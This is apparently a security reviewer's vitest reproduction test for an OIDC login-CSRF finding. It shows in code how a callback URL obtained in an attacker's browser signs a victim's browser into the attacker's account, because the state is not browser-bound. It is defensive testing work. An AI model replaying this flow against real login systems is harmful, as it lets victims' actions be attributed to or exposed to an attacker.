// code-security-reviewer DG1 round 1 — reproduction for F-DG1-103 (OIDC login CSRF / state not bound to the browser).
// NOT part of the candidate. Run by copying into a DISPOSABLE clone at apps/api/test/integration/ and executing
//   TEST_DATABASE_ADMIN_URL=... npx vitest run --project integration apps/api/test/integration/repro-oidc-login-csrf.test.ts
// Scenario: the attacker starts a login in THEIR browser, authenticates at the IdP as THEMSELVES, and stops before the
// callback. They send the callback URL (code + state) to the victim. The victim's browser — which never started a
// login and already holds its own session — opens it. Expected (secure): refused, because the state is not bound to
// the browser that started the login. Actual: the victim's own session is revoked and the victim is signed in as the
// attacker (subsequent work by the victim is attributed to / visible to the attacker's account).
import { afterAll, beforeAll, expect, it } from "vitest";
import { migrate } from "../../../../packages/db/src/migrate.ts";
import { createScratchDatabase, dropScratchDatabase, roleUrl, testDatabase } from "../../../../packages/db/test/helpers.ts";
import { FakeIdp } from "../support/fake-idp.ts";
import { call, createOrg, startApi, type TestApi } from "../support/harness.ts";

const { adminUrl } = testDatabase();
let dbName: string;
let idp: FakeIdp;
let api: TestApi;

beforeAll(async () => {
  dbName = await createScratchDatabase(adminUrl, "mth_csrfrepro");
  await migrate(roleUrl(adminUrl, dbName, "mth_owner"));
  idp = await new FakeIdp().start();
  api = await startApi({
    env: {
      AUTH_MODE: "oidc",
      OIDC_ISSUER_URL: idp.issuer,
      OIDC_CLIENT_ID: idp.clientId,
      OIDC_CLIENT_SECRET: idp.clientSecret,
      DATABASE_URL: roleUrl(adminUrl, dbName, "mth_app"),
    },
  });
  await createOrg(api.db, "CSRFORG");
});
afterAll(async () => {
  await api.close();
  await idp.stop();
  await dropScratchDatabase(adminUrl, dbName);
});

const cookieOf = (h: unknown) => (h ? String(h).split(";")[0]! : null);

async function loginAs(sub: string) {
  const start = await call(api.app, "GET", "/api/v1/auth/login");
  const { code, state } = idp.issueCode(String(start.headers["location"]), {
    sub,
    email: `${sub}@example.test`,
    email_verified: true,
    name: sub,
  });
  return { code, state, startSetCookie: start.headers["set-cookie"] ?? null };
}

it("a callback URL obtained by one browser signs a DIFFERENT browser in as that user (state not browser-bound)", async () => {
  // Victim signs in normally and has a working session.
  const v = await loginAs("victim-sub");
  const vcb = await call(api.app, "GET", `/api/v1/auth/callback?code=${v.code}&state=${v.state}`);
  const victimCookie = cookieOf(vcb.headers["set-cookie"])!;
  const meBefore = await call<{ user: { displayName: string } }>(api.app, "GET", "/api/v1/me", {
    headers: { cookie: victimCookie },
  });
  expect(meBefore.status).toBe(200);
  expect(meBefore.body.user.displayName).toBe("victim-sub");

  // Attacker: login started in the attacker's browser; /auth/login sets NO browser-binding cookie.
  const a = await loginAs("attacker-sub");
  console.log("[repro] /auth/login Set-Cookie (attacker browser):", a.startSetCookie);

  // Victim's browser opens the attacker's callback URL, carrying only the victim's own session cookie.
  const hijack = await call(api.app, "GET", `/api/v1/auth/callback?code=${a.code}&state=${a.state}`, {
    headers: { cookie: victimCookie },
  });
  console.log("[repro] callback status:", hijack.status, "location:", hijack.headers["location"]);
  const newCookie = cookieOf(hijack.headers["set-cookie"]);
  expect(hijack.status).toBe(302);
  expect(newCookie).not.toBeNull();

  const meAfter = await call<{ user: { displayName: string } }>(api.app, "GET", "/api/v1/me", {
    headers: { cookie: newCookie! },
  });
  console.log("[repro] victim browser is now signed in as:", meAfter.body.user.displayName);
  expect(meAfter.body.user.displayName).toBe("attacker-sub"); // demonstrates the defect

  const oldSession = await call(api.app, "GET", "/api/v1/me", { headers: { cookie: victimCookie } });
  console.log("[repro] victim's original session after the callback:", oldSession.status);
});
